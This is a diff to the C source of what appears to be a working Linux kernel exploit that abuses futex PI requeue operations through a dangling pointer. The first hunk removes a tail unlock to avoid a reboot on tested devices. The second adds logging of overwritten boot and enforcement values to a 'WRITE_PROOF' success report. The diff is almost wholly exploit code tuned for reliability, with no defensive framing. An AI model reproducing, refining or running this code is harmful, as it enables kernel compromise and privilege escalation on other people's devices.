@@ -203,13 +203,10 @@ void *waiter_thread(void *arg __attribute__((unused))) {
                         * reads stamped words, not the raw residue) */
     durable_stage("waiter_pselect_returned");
     atomic_store(&route_done, 1);
-    /* TAIL unlock SKIPPED in selfstamp mode: the punch already happened;
-     * this unlock's deboost walk over the still-dangling pointer is the
-     * post-phase softboot (QEMU+device proven). The owner stays blocked
-     * — the process exits and the kernel cleans up. */
-    if (env_flag("SELFSTAMP_TAILUNLOCK", 0))
-      futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-    while (!atomic_load(&owner_chain_done)) usleep(1000);
+    /* No tail unlock (its deboost walk = post-phase softboot) and NO
+     * owner_chain_done wait: main returning exits the process, killing
+     * every thread (the blocked owner included — futex exit cleanup
+     * releases it) and the dangling dies with the waiter task. */
     return NULL;
   }
   pr_info("WAIT_REQUEUE_PI ret=%ld errno=%d (%s)\n", wret, werr,
@@ -976,6 +973,9 @@ int run_exploit(int argc, char **argv) {
       read_first_line("/proc/sys/kernel/hostname", hn, sizeof(hn));
       pr_success("WP_HOSTNAME=[%.60s]\n", hn);
       live_sync_log("WP", hn);
+      char btag[128];
+      snprintf(btag, sizeof(btag), "WP_BOOTAFTER=[%.40s]", boot_after);
+      live_sync_log("WP", btag);
     }
     pr_success("WRITE_PROOF done landed=%d boot_wrote=%d enf_wrote=%d "
                "boot_after=%s enforce_after=%s success_calls "
